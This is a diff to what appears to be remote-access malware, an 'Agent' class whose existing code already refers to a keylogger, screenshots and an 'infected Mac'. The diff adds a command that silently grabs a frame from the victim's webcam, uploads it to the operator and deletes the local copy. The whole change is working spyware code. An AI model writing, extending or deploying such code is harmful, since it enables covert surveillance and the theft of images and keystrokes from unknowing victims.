@@ -16,6 +16,7 @@ import tempfile
 import socket
 import getpass
 from pynput.keyboard import Key, Listener
+import cv2
 
 if os.name == 'nt':
     from PIL import ImageGrab
@@ -303,6 +304,19 @@ class Agent(object):
         if platform.system() == "Darwin":
             self.send_output("Keylogger on infected Mac currenly not supported")
 
+    @threaded
+    def camshot(self):
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if not ret:
+            return
+        tmp_file = tempfile.NamedTemporaryFile()
+        camshot_file = tmp_file.name + ".png"
+        tmp_file.close()
+        cv2.imwrite(camshot_file, frame)
+        self.upload(camshot_file)
+        os.remove("/tmp/%s" % camshot_file)
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -374,6 +388,8 @@ class Agent(object):
                             self.screenshot()
                         elif command == 'keylogger':
                             self.getloggedkeys()
+                        elif command == 'camshot':
+                            self.camshot()
                         elif command == 'help':
                             self.help()
                         else:
